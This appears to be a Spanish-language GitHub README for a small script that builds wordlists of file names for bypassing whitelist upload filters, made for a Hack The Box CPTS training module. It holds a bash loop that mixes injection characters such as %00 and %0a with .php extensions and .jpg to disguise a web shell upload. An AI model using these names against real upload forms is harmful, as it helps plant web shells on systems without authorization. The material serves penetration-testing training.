# Character-Injection-2-extension

Simple script que permite generar diccionarios para la inyeccion en el bypass de file upload de CPTS (https://academy.hackthebox.com/module/136/section/1289) Filtros de lista blanca, basicamente es el siguiente script, "pero mejorado".

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

## New Script

## IMG 1

Ingresa el nombre de la carga util y la extension permitida por la pagina donde cargaras el archivo (ej. shell y .jpg).

![Image](https://github.com/user-attachments/assets/6a20b497-4376-48d6-8098-01127ec288ba)

## IMG 2

![Image](https://github.com/user-attachments/assets/b6f50a57-28a5-4407-980e-22c6c51df185)

## IMG 3

![Image](https://github.com/user-attachments/assets/3f280d48-6031-4721-8eff-30b57e4b9fc1)

## Uso

Solo descarga la herramienta.

Luego dale permisos con chmod +x

y ejecuta.
